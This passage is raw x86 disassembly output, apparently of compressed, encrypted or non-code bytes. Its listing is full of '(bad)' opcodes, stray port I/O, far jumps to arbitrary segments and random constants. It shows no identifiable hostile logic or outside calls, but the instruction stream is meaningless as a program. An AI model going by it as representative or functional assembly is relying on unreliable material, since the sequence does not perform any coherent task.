  417f60:	bound  eax,QWORD PTR [ecx-0x5f]
  417f63:	scas   eax,DWORD PTR es:[edi]
  417f64:	jnp    0x417f7d
  417f66:	pusha  
  417f67:	pop    ss
  417f68:	mov    fs,WORD PTR [ebx+0x297fdc2]
  417f6e:	jbe    0x417f78
  417f70:	xchg   esi,eax
  417f71:	sbb    ebx,DWORD PTR [ecx+0x13f67937]
  417f77:	lahf   
  417f78:	sub    al,0x89
  417f7a:	xchg   DWORD PTR [ebx-0x68],eax
  417f7d:	retf   
  417f7e:	adc    ecx,DWORD PTR [esi-0x31]
  417f81:	cwde   
  417f82:	dec    edx
  417f83:	popf   
  417f84:	mov    bl,0xeb
  417f86:	(bad)  
  417f87:	pop    edi
  417f88:	(bad)  
  417f89:	(bad)  
  417f8b:	and    esp,DWORD PTR [edx-0x1af22e5c]
  417f91:	in     al,0x80
  417f93:	cs add edi,ebx
  417f96:	fstp   DWORD PTR [edi-0x3601d2a2]
  417f9c:	and    BYTE PTR [ecx-0x58c87494],cl
  417fa2:	mov    edi,0x48bd07c
  417fa7:	or     esp,DWORD PTR [ebx+0x2]
  417faa:	pushf  
  417fab:	fisttp WORD PTR [ebx]
  417fad:	stos   BYTE PTR es:[edi],al
  417fae:	dec    ecx
  417faf:	pop    ss
  417fb0:	test   BYTE PTR [ebx],ah
  417fb2:	xchg   esi,eax
  417fb3:	aad    0xf1
  417fb5:	inc    ebx
  417fb6:	jge    0x41800e
  417fb8:	(bad)  
  417fb9:	and    eax,0xb5f92007
  417fbe:	(bad)  
  417fc0:	mov    ds:0x93347dd,eax
  417fc5:	cmp    DWORD PTR [edi],0x7fb8303a
  417fcb:	shl    BYTE PTR [esi],cl
  417fcd:	xchg   DWORD PTR [edi],esi
  417fcf:	imul   DWORD PTR [ebp-0x25f5ad20]
  417fd5:	sti    
  417fd6:	jg     0x417fb6
  417fd8:	mov    cl,0x1c
  417fda:	fdivp  st(6),st
  417fdc:	into   
  417fdd:	shr    DWORD PTR [eax+0x4f8bcfe6],0xe6
  417fe4:	inc    ebx
  417fe5:	xor    BYTE PTR [edx],cl
  417fe7:	mov    ebx,0x385fa3e1
  417fec:	scas   al,BYTE PTR es:[edi]
  417fed:	das    
  417fee:	cli    
  417fef:	push   ds
  417ff0:	ret    
  417ff1:	bnd jge 0x418026
  417ff4:	ficomp WORD PTR [edi+0x21aef827]
  417ffa:	add    al,BYTE PTR gs:[eax+0x1e]
  417ffe:	pop    eax
  417fff:	push   ecx
  418000:	(bad)  
  418001:	jmp    0x7817:0x85c7cfb7
  418008:	psraw  mm0,QWORD PTR [ebp-0x68]
  41800c:	add    ecx,DWORD PTR [ecx-0x79434ca2]
  418012:	push   ebp
  418013:	jns    0x418083
  418015:	scas   eax,DWORD PTR es:[edi]
  418016:	push   0x41
  418018:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418019:	mov    esi,0x4b4d4466
  41801e:	mov    DWORD PTR [ecx],esi
  418020:	xchg   ebp,eax
  418021:	std    
  418022:	cmp    DWORD PTR [esi+0x60],eax
  418025:	adc    BYTE PTR [edx+0x670a38cc],bh
  41802b:	xchg   edi,eax
  41802c:	fisub  WORD PTR [ecx-0x4f]
  41802f:	push   ss
  418030:	stc    
  418031:	or     al,0xaf
  418033:	sub    dh,BYTE PTR [ebx-0x395effd1]
  418039:	imul   esi,DWORD PTR gs:[eax-0x46892041],0xffffffd0
  418041:	jns    0x41800f
  418043:	adc    al,0xc5
  418045:	repnz add eax,0x6a7e7315
  41804b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41804c:	js     0x418056
  41804e:	adc    edi,DWORD PTR [eax-0x5bc86dd4]
  418054:	and    ebp,edi
  418056:	out    0x55,al
  418058:	ins    DWORD PTR es:[edi],dx
  418059:	add    BYTE PTR [ebx+0x24ab4685],ah
  41805f:	mov    edi,0x8c8bfc6e
  418064:	rcr    eax,0xb5
  418067:	sahf   
  418068:	sub    DWORD PTR [edi+esi*2],0x1a
  41806c:	mov    edx,0x45818a82
  418071:	push   ebx
  418072:	fsubrp st(4),st
  418074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418075:	out    0xbc,eax
  418077:	addr16 out 0x91,eax
  41807a:	test   eax,0x5e5ec77d
  41807f:	add    DWORD PTR [ebx-0x3d27f596],ebx
  418085:	mov    DWORD PTR [eax-0x852576],ebx
  41808b:	xchg   ebp,eax
  41808c:	xchg   ebp,edx
  41808e:	jge    0x4180c1
  418090:	push   ebx
  418091:	std    
  418092:	add    BYTE PTR cs:[ebx+0x46],ah
  418096:	mov    edi,0xce5e5ef4
  41809b:	test   BYTE PTR [esi+ecx*4+0x3527704a],dh
  4180a2:	out    0x39,eax
  4180a4:	loopne 0x4180c8
  4180a6:	sbb    DWORD PTR [edi+0x97e0bb8],edx
  4180ac:	lea    edx,[bx+si]
  4180af:	cmp    eax,0x81beba71
  4180b4:	or     DWORD PTR [ecx-0x724260a],eax
  4180ba:	arpl   WORD PTR [ebx+0x1],dx
  4180bd:	pop    ecx
  4180be:	popf   
  4180bf:	pop    edi
  4180c0:	dec    edi
  4180c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180c2:	stos   BYTE PTR es:[edi],al
  4180c3:	push   edx
  4180c4:	dec    edi
  4180c5:	inc    esp
  4180c6:	dec    esp
  4180c7:	mov    eax,0xb412f9a3
  4180cc:	fiadd  DWORD PTR [ebx-0x1b100a66]
  4180d2:	loop   0x4180b2
  4180d4:	fild   WORD PTR ds:0xe3b2ca70
  4180da:	fidivr WORD PTR [esi]
  4180dc:	dec    ebx
  4180dd:	mov    bl,0x76
  4180df:	imul   eax,ecx,0x22c5c84e
  4180e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180e6:	jmp    0xc098:0xce31863c
  4180ed:	mov    eax,0xec304a8e
  4180f2:	pop    ebp
  4180f3:	pop    ss
  4180f4:	sub    eax,ecx
  4180f6:	sub    cl,BYTE PTR [edi-0x77361728]
  4180fc:	inc    eax
  4180fd:	int    0xc
  4180ff:	les    edi,FWORD PTR [esi+0x777c0b6b]
  418105:	jns    0x418160
  418107:	dec    ebp
  418108:	retf   
  418109:	jmp    0x7058fa63
  41810e:	xor    eax,0x4912a4b6
  418113:	in     eax,0x8b
  418115:	push   edx
  418116:	and    eax,0x6af9ad9f
  41811b:	mov    al,ds:0x55f008cd
  418120:	imul   ecx,DWORD PTR [eax],0xffffffc6
  418123:	adc    eax,0x32b9cbbb
  418128:	inc    eax
  418129:	jge    0x4181a3
  41812b:	outs   dx,DWORD PTR ds:[esi]
  41812c:	fdiv   st(7),st
  41812e:	adc    DWORD PTR ds:0x887ea54,eax
  418134:	mov    ah,0xbe
  418136:	mov    al,0x56
  418138:	sar    edx,1
  41813a:	stc    
  41813b:	in     eax,dx
  41813c:	pop    eax
  41813d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41813e:	and    ebx,0xf00fd9a3
  418144:	xchg   ecx,esp
  418146:	sbb    eax,0x6b9207ca
  41814b:	inc    ebp
  41814c:	(bad)  
  41814d:	jle    0x4180fe
  41814f:	mov    dh,0x9f
  418151:	das    
  418152:	dec    ecx
  418153:	or     eax,edi
  418155:	xor    eax,DWORD PTR [edx+0x17]
  418158:	rol    edi,1
  41815a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41815b:	test   al,0xa1
  41815d:	ins    BYTE PTR es:[edi],dx
  41815e:	imul   edx,DWORD PTR cs:[edx*8-0x8b33438],0xfffffff4
  418167:	jne    0x418136
  418169:	adc    DWORD PTR [esi+0x292cee01],eax
  41816f:	sbb    dh,0x9f
  418172:	js     0x4181da
  418174:	dec    ebx
  418175:	mov    ch,BYTE PTR [eax-0x3d]
  418178:	mov    ebp,0xda11b129
  41817d:	aaa    
  41817e:	jo     0x41817f
  418180:	in     eax,0x1e
  418182:	cdq    
  418183:	dec    esi
  418184:	cwde   
  418185:	or     DWORD PTR [ebp-0x4d88bcee],0xbfaedd39
  41818f:	push   edx
  418190:	fsub   st,st(5)
  418192:	js     0x418115
  418194:	inc    edx
  418195:	xchg   ecx,eax
  418196:	push   cs
  418197:	int    0xc4
  418199:	push   ebx
  41819a:	ds loope 0x41816f
  41819d:	ins    DWORD PTR es:[edi],dx
  41819e:	mov    esp,0xbfa698e2
  4181a3:	repz inc edi
  4181a5:	loop   0x4181da
  4181a7:	aaa    
  4181a8:	sbb    eax,0x88f0f8e3
  4181ad:	sbb    edi,eax
  4181af:	adc    edi,DWORD PTR [ebp+0x18c7ae5]
  4181b5:	retf   0xfb8c
  4181b8:	retf   0xfd67
  4181bb:	out    0x44,eax
  4181bd:	sub    bl,BYTE PTR [ebp-0x2e]
  4181c0:	pop    ebp
  4181c1:	jae    0x4181c8
  4181c3:	outs   dx,DWORD PTR ds:[esi]
  4181c4:	mov    ecx,0x1c20cddf
  4181c9:	push   0x55
  4181cb:	push   ecx
  4181cc:	les    eax,FWORD PTR [ebx]
  4181ce:	ss js  0x418214
  4181d1:	xor    eax,0x613633dc
  4181d6:	daa    
  4181d7:	mov    al,ds:0x370dc2c8
  4181dc:	inc    esi
  4181dd:	in     al,dx
  4181de:	cdq    
  4181df:	(bad)  
  4181e0:	dec    edi
  4181e1:	push   ebp
  4181e2:	xchg   edi,eax
  4181e3:	sub    al,0x64
  4181e5:	jmp    0xf73da700
  4181ea:	inc    edi
  4181eb:	sbb    al,0xed
  4181ed:	push   ecx
  4181ee:	mov    dh,0xcc
  4181f0:	jp     0x4181ee
  4181f2:	lods   eax,DWORD PTR ds:[esi]
  4181f3:	int    0xb2
  4181f5:	outs   dx,DWORD PTR ds:[esi]
  4181f6:	mov    ecx,0xe8ebb5dc
  4181fb:	cmc    
  4181fc:	cmp    dl,BYTE PTR [ebx]
  4181fe:	ret    0x4ce1
  418201:	(bad)  
  418202:	cmp    esp,DWORD PTR [ebp-0x21]
  418205:	pop    ds
  418206:	adc    al,0xeb
  418208:	cmp    ch,dl
  41820a:	sahf   
  41820b:	repz hlt 
  41820d:	rcl    DWORD PTR [esp+ebp*4-0x5c289ba0],cl
  418214:	inc    eax
  418215:	mov    eax,ds:0xacaaf39f
  41821a:	mov    eax,ds:0x28cf2ff3
  41821f:	mov    eax,ds:0xbedc3592
  418224:	mov    dl,0x13
  418226:	xchg   DWORD PTR [ebp+0x6de438f9],eax
  41822c:	fild   DWORD PTR [ebx+ebx*4-0x77]
  418230:	push   eax
  418231:	jmp    0x4181b3
  418233:	mov    ebp,0xf458c5a3
  418238:	out    dx,eax
  418239:	lods   al,BYTE PTR ds:[esi]
  41823a:	push   0x7e676d96
  41823f:	pop    ecx
  418240:	mov    ds:0xb2574170,eax
  418245:	push   cs
  418246:	lock sub DWORD PTR [esp+ebx*8+0x5ef87150],esp
  41824e:	xchg   edi,eax
  41824f:	inc    ebp
  418250:	fist   DWORD PTR [edx+0x5f]
  418253:	or     DWORD PTR [ebp+ebx*1-0x58],edx
  418257:	ins    BYTE PTR es:[edi],dx
  418258:	push   es
  418259:	pop    es
  41825a:	adc    al,BYTE PTR [eax-0x7c]
  41825d:	ficomp DWORD PTR [ebx+0x36]
  418260:	cmp    al,0x79
  418262:	adc    BYTE PTR [ebx],0xbb
  418265:	cmc    
  418266:	outs   dx,DWORD PTR ds:[esi]
  418267:	mov    eax,ds:0x7bf7a102
  41826c:	or     BYTE PTR ds:0x51c6d826,al
  418272:	and    DWORD PTR [esi],0x102f6ebe
  418278:	inc    ecx
  418279:	imul   ebx,DWORD PTR [esi-0x6bc9ca15],0xffffffb2
  418280:	ds (bad) 
  418282:	pop    edx
  418283:	adc    ah,BYTE PTR [eax]
  418285:	je     0x418280
  418287:	cmc    
  418288:	inc    esp
  418289:	cmp    eax,0x36a44ca8
  41828e:	xchg   ebx,eax
  41828f:	scas   al,BYTE PTR es:[edi]
  418290:	enter  0x3b8a,0x45
  418294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418295:	and    BYTE PTR [edi+0x304605c4],ah
  41829b:	fsubr  DWORD PTR [ecx+0x71]
  41829e:	inc    ebp
  41829f:	cmp    al,0x60
  4182a1:	fist   DWORD PTR [esi]
  4182a3:	and    DWORD PTR [edi-0x8a850a5],ebx
  4182a9:	daa    
  4182aa:	fstp   DWORD PTR [ebx+0x4e]
  4182ad:	push   eax
  4182ae:	int    0xe6
  4182b0:	icebp  
  4182b1:	mov    edi,0x8856adac
  4182b6:	cmp    ch,cl
  4182b8:	sbb    DWORD PTR [edi+0x42aa79af],esp
  4182be:	int    0x9c
  4182c0:	ret    0x6cc
  4182c3:	pop    ds
  4182c4:	adc    DWORD PTR [eax],ecx
  4182c6:	inc    edx
  4182c7:	dec    edx
  4182c8:	push   esi
  4182c9:	je     0x4182f7
  4182cb:	int    0xf1
  4182cd:	int    0xf9
  4182cf:	sub    eax,0xb3413188
  4182d4:	mov    ds:0x7d074fc2,al
  4182d9:	aaa    
  4182da:	sbb    al,BYTE PTR [eax+esi*8]
  4182dd:	cld    
  4182de:	pop    ecx
  4182df:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4182e1:	test   eax,0x23229979
  4182e6:	(bad)  
  4182e7:	mov    eax,0x74f8806b
  4182ec:	jns    0x4182b3
  4182ee:	sub    eax,0xfb80869d
  4182f3:	push   0xffffffd0
  4182f5:	into   
  4182f6:	dec    esp
  4182f7:	ret    
  4182f8:	aad    0xe
  4182fa:	sub    dl,al
  4182fc:	push   ds
  4182fd:	scas   al,BYTE PTR es:[edi]
  4182fe:	dec    esi
  4182ff:	sti    
  418300:	inc    esi
  418301:	mov    eax,0x44f97267
  418306:	repz data16 shl BYTE PTR [edi+0x24acdf7b],1
  41830e:	sar    DWORD PTR [ebx],1
  418310:	imul   esi,DWORD PTR [edx-0x5f567f9f],0xffffffa7
  418317:	(bad)  
  418319:	lods   al,BYTE PTR ds:[esi]
  41831a:	out    dx,al
  41831b:	inc    edx
  41831c:	retf   0xc53e
  41831f:	popf   
  418320:	out    dx,al
  418321:	imul   esp,DWORD PTR [eax+0x58],0x1c
  418325:	mov    ?,WORD PTR [edx]
  418327:	or     esi,DWORD PTR [esi+eax*2]
  41832a:	mov    al,0x91
  41832c:	sub    DWORD PTR [edi-0x3a],esp
  41832f:	mov    DWORD PTR [edx],ebx
  418331:	mov    ebx,edi
  418333:	and    DWORD PTR [ecx+0x774a7c2],0xbd1fcb3c
  41833d:	bound  edi,QWORD PTR [ebx+0x49b2359d]
  418343:	xchg   ebp,eax
  418344:	cs sar DWORD PTR cs:[ecx],0xcd
  418349:	lahf   
  41834a:	sub    edi,DWORD PTR [ebp+ebx*8-0x6c859be6]
  418351:	xor    DWORD PTR [esp+esi*2+0x5f],esp
  418355:	and    ebp,ebp
  418357:	fild   DWORD PTR [ebp-0x80]
  41835a:	xchg   edi,eax
  41835b:	mov    ecx,0x3c530d84
  418360:	and    dl,bh
  418362:	or     BYTE PTR [esi*4+0x61a58ec2],dl
  418369:	rol    DWORD PTR [ebx+0x6ab4a000],1
  41836f:	mov    eax,ds:0x46cc750e
  418374:	jle    0x41838a
  418376:	shr    DWORD PTR [edx],0x93
  418379:	fdivr  st,st(5)
  41837b:	fwait
  41837c:	xchg   ch,bh
  41837e:	fldenv [edx]
  418380:	inc    ebx
  418381:	jo     0x41832b
  418383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418384:	pop    es
  418385:	xchg   edi,eax
  418386:	fs in  eax,0xa2
  418389:	jmp    edi
  41838b:	repz mul ebp
  41838e:	std    
  41838f:	mov    ebp,0x4c1384c1
  418394:	adc    BYTE PTR [esi-0x53a2307d],0x73
  41839b:	push   edi
  41839c:	cmovo  esi,DWORD PTR [ebp*1-0x6bc2588]
  4183a4:	(bad)  
  4183a5:	out    dx,eax
  4183a6:	test   eax,0xdb8a9701
  4183ab:	mov    al,BYTE PTR [ebp+0x507bb565]
  4183b1:	sub    al,0x6e
  4183b3:	mov    ecx,0x5b39568a
  4183b8:	and    dl,BYTE PTR [ebx]
  4183ba:	sar    BYTE PTR [edx+0x796cb9a],1
  4183c0:	aas    
  4183c1:	aaa    
  4183c2:	in     eax,dx
  4183c3:	(bad)  
  4183c4:	pop    esi
  4183c5:	(bad)  
  4183c6:	mov    edx,0x7bb7b27
  4183cb:	xlat   BYTE PTR ds:[ebx]
  4183cc:	call   0x56c:0x110cf0ef
  4183d3:	loopne 0x41838c
  4183d5:	daa    
  4183d6:	repnz inc ebx
  4183d8:	test   esp,edx
  4183da:	jmp    0x2014:0xf1e7a5d4
  4183e1:	mov    edi,0x59bc5779
  4183e6:	aad    0x6d
  4183e8:	mov    al,ds:0xff120a1c
  4183ed:	and    al,0x57
  4183ef:	push   es
  4183f0:	pop    ebp
  4183f1:	dec    ecx
  4183f2:	pop    edx
  4183f3:	add    BYTE PTR [esi],0xd1
  4183f6:	pusha  
  4183f7:	inc    eax
  4183f8:	cs ret 0x5f16
  4183fc:	(bad)  
  4183fd:	pop    ecx
  4183fe:	ficomp WORD PTR [edi+0x8]
  418401:	call   DWORD PTR cs:[edi-0xc]
  418405:	pop    esp
  418406:	iret   
  418407:	daa    
  418408:	shr    DWORD PTR [ebx],0x86
  41840b:	pushf  
  41840c:	iret   
  41840d:	cmp    DWORD PTR [ecx],ebp
  41840f:	push   0x75
  418411:	push   0x160dae0a
  418416:	or     al,BYTE PTR [eax-0x39]
  418419:	fadd   st(4),st
  41841b:	in     al,0x3a
  41841d:	cdq    
  41841e:	jns    0x4183f4
  418420:	aaa    
  418421:	leave  
  418422:	aaa    
  418423:	daa    
  418424:	pushf  
  418425:	lahf   
  418426:	into   
  418427:	cmp    eax,0xe2f9df79
  41842c:	mov    ah,0xd0
  41842e:	sbb    eax,0x7def8d43
  418434:	ror    ch,cl
  418436:	push   0x3
  418438:	mov    ds:0x6d175941,eax
  41843d:	lds    edi,FWORD PTR es:[eax-0x3f]
  418441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418442:	mov    ah,0xa2
  418444:	lock fsub st,st(0)
  418447:	adc    DWORD PTR [esi+0x58f7e621],edx
  41844d:	loopne 0x418490
  41844f:	xor    cl,BYTE PTR [ecx+0x73]
  418452:	js     0x4183e0
  418454:	jl     0x4183e6
  418456:	loope  0x418488
  418458:	xor    al,0x3e
  41845a:	cmc    
  41845b:	sbb    esp,DWORD PTR [ebp+eax*4+0x6e]
  41845f:	ret    0x58b8
  418462:	mov    ds:0x9381b9e1,eax
  418467:	jecxz  0x4184c1
  418469:	push   edi
  41846a:	loope  0x418455
  41846c:	xchg   esi,esp
  41846e:	sbb    BYTE PTR [ecx-0x11c61791],ah
  418474:	sbb    BYTE PTR [ecx-0x1b],ch
  418477:	push   eax
  418478:	or     al,0x15
  41847a:	inc    DWORD PTR ss:[ebp-0x51]
  41847e:	lock (bad) 
  418480:	xor    eax,DWORD PTR [eax-0x63]
  418483:	push   eax
  418484:	xchg   edx,eax
  418485:	rol    ebp,0xef
  418488:	pushf  
  418489:	div    esi
  41848b:	adc    dl,BYTE PTR [edi-0x6971a8c7]
  418491:	jg     0x4184c9
  418493:	jbe    0x418485
  418495:	jns    0x4184d4
  418497:	mov    cl,0xc1
  418499:	nop
  41849a:	pop    esp
  41849b:	test   BYTE PTR [ecx+0x1d],cl
  41849e:	ficom  WORD PTR [ebx-0x658652ae]
  4184a4:	cmp    eax,0x753ad4cc
  4184a9:	mov    dl,0xc
  4184ab:	fild   DWORD PTR [ebp-0x36418f54]
  4184b1:	je     0x41847a
  4184b3:	dec    edi
  4184b4:	mov    dl,0xc
  4184b6:	mov    ecx,0x1f1628c2
  4184bb:	call   0xbad8:0xbcfff442
  4184c2:	jge    0x4184ef
  4184c4:	leave  
  4184c5:	and    al,0x71
  4184c7:	ror    BYTE PTR [edx+0x7a],cl
  4184ca:	in     al,dx
  4184cb:	jge    0x418477
  4184cd:	out    dx,al
  4184ce:	sbb    DWORD PTR [ecx+0x59629d34],ecx
  4184d4:	mov    ebx,DWORD PTR [ebx-0x4]
  4184d7:	shl    BYTE PTR [ebx+ecx*2-0x7a7455c4],1
  4184de:	lods   al,BYTE PTR ds:[esi]
  4184df:	imul   eax,DWORD PTR [eax],0xffa1de34
  4184e5:	xchg   ebp,eax
  4184e6:	das    
  4184e7:	in     al,dx
  4184e8:	dec    esp
  4184e9:	into   
  4184ea:	imul   ecx,DWORD PTR [ebx],0x25
  4184ed:	pop    ebp
  4184ee:	out    dx,al
  4184ef:	sub    BYTE PTR [esi-0x1c08b807],bl
  4184f5:	pop    ebp
  4184f6:	in     al,0x36
  4184f8:	jne    0x418549
  4184fa:	push   es
  4184fb:	sti    
  4184fc:	mov    DWORD PTR [esi-0x2d],ecx
  4184ff:	mov    ds:0xfd504a05,eax
  418504:	jne    0x418577
  418506:	inc    BYTE PTR cs:[esi-0x4caa1395]
  41850d:	and    BYTE PTR [eax],bh
  41850f:	pushf  
  418510:	lds    esi,FWORD PTR [ecx+eax*8-0x3e]
  418514:	cwde   
  418515:	xor    eax,0x24970b60
  41851a:	outs   dx,DWORD PTR ds:[esi]
  41851b:	push   0x5c
  41851d:	lock jg 0x41858f
  418520:	cmc    
  418521:	ja     0x41853e
  418523:	popf   
  418524:	or     BYTE PTR [ecx-0x52dedd44],bh
  41852a:	mov    bl,0x8a
  41852c:	cmp    cl,BYTE PTR [edx+ebx*8]
  41852f:	out    dx,eax
  418530:	aaa    
  418531:	xor    ch,BYTE PTR es:[eax+edi*2]
  418535:	mov    ch,BYTE PTR [ebp+0x65]
  418538:	add    al,0x1f
  41853a:	adc    bl,BYTE PTR [edx]
  41853c:	cs aam 0x61
  41853f:	(bad)  
  418540:	cmp    BYTE PTR [edx+0x14],bl
  418543:	out    dx,al
  418544:	popaw  
  418546:	pop    es
  418547:	mov    esp,0x3a7eba83
  41854c:	push   ds
  41854d:	(bad)  
  41854e:	aas    
  41854f:	je     0x418595
  418551:	imul   edx,DWORD PTR [ecx],0x29dd24cd
  418557:	or     DWORD PTR [esi],ebx
  418559:	xor    eax,edi
  41855b:	sbb    al,dl
  41855d:	mov    ds:0x52db012,eax
  418562:	pushf  
  418563:	cmp    bl,al
  418565:	outs   dx,DWORD PTR ds:[esi]
  418566:	pop    ebx
  418567:	or     DWORD PTR [esi-0x61c76075],edx
  41856d:	mov    ds:0xb0d5449f,eax
  418572:	aas    
  418573:	pop    edi
  418574:	pop    ebx
  418575:	mov    eax,0x6e9d862d
  41857a:	jle    0x4185bb
  41857c:	nop
  41857d:	jg     0x4185cf
  41857f:	ins    DWORD PTR es:[edi],dx
  418580:	fcomp  QWORD PTR [ebx+0x5d95d558]
  418586:	outs   dx,DWORD PTR ds:[esi]
  418587:	rcl    bh,0x65
  41858a:	retf   
  41858b:	mov    eax,ds:0x74500cab
  418590:	and    cl,BYTE PTR [ecx+0x43]
  418593:	sub    BYTE PTR [ebx],0x3c
  418596:	lahf   
  418597:	clc    
  418598:	fmul   DWORD PTR [esi]
  41859a:	aaa    
  41859b:	aad    0xc0
  41859d:	push   0xffffffa9
  41859f:	daa    
  4185a0:	mov    ecx,0x42a36e1b
  4185a5:	push   edx
  4185a6:	xchg   esi,eax
  4185a7:	iret   
  4185a8:	mov    cl,0x23
  4185aa:	arpl   cx,ax
  4185ac:	pop    esi
  4185ad:	or     BYTE PTR [ebx-0x6],dl
  4185b0:	popf   
  4185b1:	cli    
  4185b2:	mul    BYTE PTR [ebx-0x1c2d1a26]
  4185b8:	cmp    bl,bh
  4185ba:	popa   
  4185bb:	cdq    
  4185bc:	ret    
  4185bd:	mov    bl,0xd3
  4185bf:	jmp    0xb8078f27
  4185c4:	or     BYTE PTR [edi+0x17],0x28
  4185c8:	fcmovb st,st(3)
  4185ca:	fbstp  TBYTE PTR [eax-0x583455db]
  4185d0:	mov    edx,0x17eac56e
  4185d5:	shl    bh,cl
  4185d7:	inc    edx
  4185d8:	adc    dh,BYTE PTR [esi]
  4185da:	add    eax,0xcf13e369
  4185df:	mov    esp,esi
  4185e1:	and    ecx,edx
  4185e3:	lock xchg ecx,eax
  4185e5:	cmp    DWORD PTR [eax+edi*1],ebp
  4185e8:	mov    bl,0xe3
  4185ea:	sbb    al,BYTE PTR [ebx-0x37]
  4185ed:	mov    dh,0x5d
  4185ef:	es cli 
  4185f1:	xor    bh,BYTE PTR [ebx+0x4e]
  4185f4:	add    eax,0x2ff3a38
  4185f9:	test   BYTE PTR [edx],dl
  4185fb:	inc    ebp
  4185fc:	test   DWORD PTR [edi],ecx
  4185fe:	cld    
  4185ff:	int3   
  418600:	add    esi,ebx
  418602:	jmp    0x8a7e:0x940f09e2
  418609:	bound  edi,QWORD PTR [edx-0x26cbe322]
  41860f:	cmp    BYTE PTR [edi-0x5f8cddd8],dl
  418615:	lods   eax,DWORD PTR ds:[esi]
  418616:	push   esi
  418617:	push   ebx
  418618:	aad    0x62
  41861a:	cmp    bh,dh
  41861c:	and    al,0xfd
  41861e:	dec    ebx
  41861f:	iret   
  418620:	dec    ecx
  418621:	iret   
  418622:	jnp    0x4185f2
  418624:	mov    eax,ds:0xb6595f08
  418629:	xchg   edx,eax
  41862a:	xchg   ebx,eax
  41862b:	push   ebx
  41862c:	ins    DWORD PTR es:[edi],dx
  41862d:	add    DWORD PTR [edi+0x25030d19],ebp
  418633:	pop    ds
  418634:	in     al,dx
  418635:	bound  esp,QWORD PTR [ebx+0x2cb25160]
  41863b:	jl     0x41860d
  41863d:	jmp    0x41861f
  41863f:	inc    edx
  418640:	fiadd  WORD PTR [ebp+ecx*1-0x4]
  418644:	fstp   QWORD PTR [esi-0xf]
  418647:	sub    BYTE PTR ds:0x16ff2579,cl
  41864d:	dec    ecx
  41864e:	and    al,BYTE PTR [esi]
  418650:	dec    edx
  418651:	aad    0xe5
  418653:	ret    
  418654:	cld    
  418655:	inc    esp
  418656:	sbb    eax,edx
  418658:	mov    DWORD PTR [esp+edx*4],edi
  41865b:	mov    ch,0xa7
  41865d:	popf   
  41865e:	(bad)  
  41865f:	jmp    0x4186dc
  418661:	pop    esp
  418662:	pop    eax
  418663:	dec    edi
  418665:	push   edx
  418666:	pop    es
  418667:	ror    DWORD PTR [edi],1
  418669:	xor    al,0x0
  41866b:	les    edx,FWORD PTR [esi+ebp*1]
  41866e:	scas   al,BYTE PTR es:[edi]
  41866f:	into   
  418670:	imul   dl
  418672:	lods   al,BYTE PTR ds:[esi]
  418673:	imul   ebp,DWORD PTR ds:0x6a69da8b,0x38
  41867a:	and    DWORD PTR [eax+0x3407eedc],edi
  418680:	mov    bh,0xbd
  418682:	lock dec ebx
  418684:	cmc    
  418685:	das    
  418686:	sar    DWORD PTR [esi-0x3e83dfa2],0x8
  41868d:	dec    ebp
  41868e:	stos   DWORD PTR es:[edi],eax
  41868f:	push   ss
  418690:	in     al,dx
  418691:	inc    ebx
  418692:	mov    al,0x92
  418694:	(bad)  
  418698:	push   ecx
  418699:	xchg   esp,eax
  41869a:	pop    ebp
  41869b:	out    dx,eax
  41869c:	pop    edi
  41869d:	add    al,BYTE PTR [ebp-0x7b]
  4186a0:	jecxz  0x418671
  4186a2:	test   eax,0x4b481ddc
  4186a7:	dec    eax
  4186a8:	outs   dx,BYTE PTR ds:[esi]
  4186a9:	icebp  
  4186aa:	pop    edi
  4186ab:	aas    
  4186ac:	jns    0x418701
  4186ae:	scas   al,BYTE PTR es:[edi]
  4186af:	sti    
  4186b0:	xchg   ecx,eax
  4186b1:	js     0x4186ee
  4186b3:	cmc    
  4186b4:	test   DWORD PTR [esi-0x19b30160],edi
  4186ba:	retf   0x2cc4
  4186bd:	int    0xcc
  4186bf:	aam    0xe2
  4186c1:	iret   
  4186c2:	sbb    eax,0x38fe1744
  4186c7:	imul   esi,esp,0xffffff9a
  4186ca:	nop
  4186cb:	xor    BYTE PTR [ecx+eiz*4+0x17],bl
  4186cf:	mov    ds:0xd45bd65f,eax
  4186d4:	call   0xc0227098
  4186d9:	into   
  4186da:	rcr    esi,1
  4186dc:	mov    esi,0x2e81fbfb
  4186e1:	or     ecx,DWORD PTR [eax-0x63]
  4186e4:	cwde   
  4186e5:	push   0x65
  4186e7:	call   0xd1366875
  4186ec:	or     ebp,DWORD PTR [eax-0xf]
  4186ef:	(bad)  
  4186f0:	loopne 0x41876a
  4186f2:	cmp    ebp,0x70b26d58
  4186f8:	fs xchg bl,al
  4186fb:	jmp    0x8f87:0x7986a1bd
  418702:	mov    cl,0x3a
  418704:	sub    esi,DWORD PTR [edx]
  418706:	mov    ds:0x3e88e541,al
  41870b:	adc    bl,BYTE PTR [ebx-0x68]
  41870e:	fcomp  st(4)
  418710:	add    al,BYTE PTR [eax+0x6bed52af]
  418716:	jle    0x418736
  418718:	mov    bl,0x9b
  41871a:	js     0x4186fa
  41871c:	cvtps2pd xmm5,QWORD PTR [ebp-0x77]
  418720:	(bad)  
  418721:	xchg   ebx,eax
  418722:	inc    ebx
  418723:	dec    edx
  418724:	lahf   
  418725:	ins    BYTE PTR es:[edi],dx
  418726:	or     ebp,esi
  418728:	add    BYTE PTR [edx+ebx*8-0x1b18a25b],ch
  41872f:	call   0xf2701231
  418734:	dec    eax
  418735:	pop    ebx
  418736:	push   esi
  418737:	sbb    edi,DWORD PTR [esi-0x5d9ab4d8]
  41873d:	xchg   esp,eax
  41873e:	mov    ds:0x963a44e0,al
  418743:	ins    DWORD PTR es:[edi],dx
  418744:	mov    ebp,eax
  418746:	or     ah,BYTE PTR [esi-0x37ee7fe3]
  41874c:	scas   eax,DWORD PTR es:[edi]
  41874d:	jns    0x418718
  41874f:	out    dx,al
  418750:	sbb    ebx,DWORD PTR [edx]
  418752:	fdivr  st,st(6)
  418754:	cli    
  418755:	(bad)  
